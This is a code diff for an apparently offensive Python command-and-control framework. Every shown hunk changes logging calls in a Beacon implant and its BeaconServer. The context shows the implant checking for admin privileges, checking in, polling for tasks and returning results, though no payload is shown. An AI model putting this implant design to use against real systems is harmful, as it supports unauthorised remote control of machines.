@@ -176,7 +176,7 @@ class Beacon(BaseC2):
             ip_address = s.getsockname()[0]
             s.close()
         except (OSError, socket.error) as e:
-            logger.debug(f"Failed to get local IP: {e}")
+            logger.debug("Failed to get local IP: %s", e)
 
         # 检测完整性级别
         integrity = "medium"
@@ -187,7 +187,7 @@ class Beacon(BaseC2):
                 if ctypes.windll.shell32.IsUserAnAdmin():
                     integrity = "high"
             except (ImportError, AttributeError, OSError) as e:
-                logger.debug(f"Failed to check admin status: {e}")
+                logger.debug("Failed to check admin status: %s", e)
 
         elif os.geteuid() == 0:
             integrity = "high"
@@ -245,18 +245,18 @@ class Beacon(BaseC2):
                 # 发送签到
                 self._checkin()
 
-                logger.info(f"Beacon connected: {self.beacon_id}")
+                logger.info("Beacon connected: %s", self.beacon_id)
                 return True
 
             self._set_status(C2Status.ERROR)
             return False
 
         except (ConnectionError, TimeoutError, OSError) as e:
-            logger.error(f"Beacon connect error: {e}")
+            logger.error("Beacon connect error: %s", e)
             self._set_status(C2Status.ERROR)
             return False
         except ValueError as e:
-            logger.error(f"Beacon config error: {e}")
+            logger.error("Beacon config error: %s", e)
             self._set_status(C2Status.ERROR)
             return False
 
@@ -266,7 +266,7 @@ class Beacon(BaseC2):
             try:
                 self._tunnel.disconnect()
             except (ConnectionError, OSError) as e:
-                logger.warning(f"Error during disconnect: {e}")
+                logger.warning("Error during disconnect: %s", e)
 
             self._tunnel = None
 
@@ -416,7 +416,7 @@ class Beacon(BaseC2):
                 self._thread.start()
                 self._starting = False  # 启动完成
 
-            logger.info(f"Beacon started: {self.beacon_id}")
+            logger.info("Beacon started: %s", self.beacon_id)
 
         finally:
             self._startup_lock.release()
@@ -525,7 +525,7 @@ class Beacon(BaseC2):
                             break
 
                 except (ConnectionError, TimeoutError, OSError) as e:
-                    logger.error(f"Beacon loop network error: {e}")
+                    logger.error("Beacon loop network error: %s", e)
 
                     # 尝试重连
                     if not self._stop_event.is_set() and self.status == C2Status.CONNECTED:
@@ -534,7 +534,7 @@ class Beacon(BaseC2):
                             self._request_stop()
                             break
                 except (ValueError, KeyError) as e:
-                    logger.error(f"Beacon loop data error: {e}")
+                    logger.error("Beacon loop data error: %s", e)
                     # 数据错误不需要重连，继续下一轮
 
                 # 计算睡眠时间
@@ -570,10 +570,10 @@ class Beacon(BaseC2):
             data = self._codec.encode_checkin(self._info)
             return self.send(data)
         except (ConnectionError, TimeoutError, OSError) as e:
-            logger.error(f"Checkin network error: {e}")
+            logger.error("Checkin network error: %s", e)
             return False
         except (ValueError, KeyError) as e:
-            logger.error(f"Checkin encode error: {e}")
+            logger.error("Checkin encode error: %s", e)
             return False
 
     def _send_heartbeat(self) -> None:
@@ -582,9 +582,9 @@ class Beacon(BaseC2):
             data = encode_heartbeat(self.beacon_id)
             self.send(data)
         except (ConnectionError, TimeoutError, OSError) as e:
-            logger.debug(f"Heartbeat network error: {e}")
+            logger.debug("Heartbeat network error: %s", e)
         except (ValueError, KeyError) as e:
-            logger.debug(f"Heartbeat encode error: {e}")
+            logger.debug("Heartbeat encode error: %s", e)
 
     def _check_tasks(self) -> List[Task]:
         """获取待执行任务"""
@@ -593,9 +593,9 @@ class Beacon(BaseC2):
             if response:
                 return decode_tasks(response)
         except (ConnectionError, TimeoutError, OSError) as e:
-            logger.debug(f"Check tasks network error: {e}")
+            logger.debug("Check tasks network error: %s", e)
         except (ValueError, KeyError) as e:
-            logger.debug(f"Check tasks decode error: {e}")
+            logger.debug("Check tasks decode error: %s", e)
 
         return []
 
@@ -605,10 +605,10 @@ class Beacon(BaseC2):
             data = encode_result(result)
             return self.send(data)
         except (ConnectionError, TimeoutError, OSError) as e:
-            logger.error(f"Send result network error: {e}")
+            logger.error("Send result network error: %s", e)
             return False
         except (ValueError, KeyError) as e:
-            logger.error(f"Send result encode error: {e}")
+            logger.error("Send result encode error: %s", e)
             return False
 
     # ==================== 任务处理器 ====================
@@ -880,7 +880,7 @@ class BeaconServer:
                 try:
                     self._cleanup_stale_beacons()
                 except Exception as e:
-                    logger.error(f"清理 Beacon 失败: {e}")
+                    logger.error("清理 Beacon 失败: %s", e)
 
     def add_task(self, beacon_id: str, task_type: str, payload: Any, timeout: float = 300.0) -> str:
         """
@@ -902,7 +902,7 @@ class BeaconServer:
                 self.tasks[beacon_id] = []
             self.tasks[beacon_id].append(task)
 
-        logger.info(f"Task added for {beacon_id}: {task.id}")
+        logger.info("Task added for %s: %s", beacon_id, task.id)
         return task.id
 
     def get_beacons(self) -> List[BeaconInfo]:
@@ -950,7 +950,7 @@ class BeaconServer:
                             ip_address=data.get("ip_address", ""),
                             pid=data.get("pid", 0),
                         )
-                        logger.info(f"New beacon: {beacon_id}")
+                        logger.info("New beacon: %s", beacon_id)
                     else:
                         self.beacons[beacon_id].last_seen = time.time()
 
@@ -999,10 +999,10 @@ class BeaconServer:
                 # 修剪结果列表，防止内存泄漏
                 self._trim_results(beacon_id)
 
-            logger.info(f"Result from {beacon_id}: task {result.task_id}")
+            logger.info("Result from %s: task %s", beacon_id, result.task_id)
             return jsonify({"status": "ok"})
 
-        logger.info(f"Beacon server starting on {self.host}:{self.port}")
+        logger.info("Beacon server starting on %s:%s", self.host, self.port)
         self._running = True
 
         # 启动后台清理线程
@@ -1048,7 +1048,7 @@ class BeaconServer:
             self.results.pop(beacon_id, None)
 
         if removed:
-            logger.info(f"手动清理 Beacon: {beacon_id}")
+            logger.info("手动清理 Beacon: %s", beacon_id)
 
         return removed
 
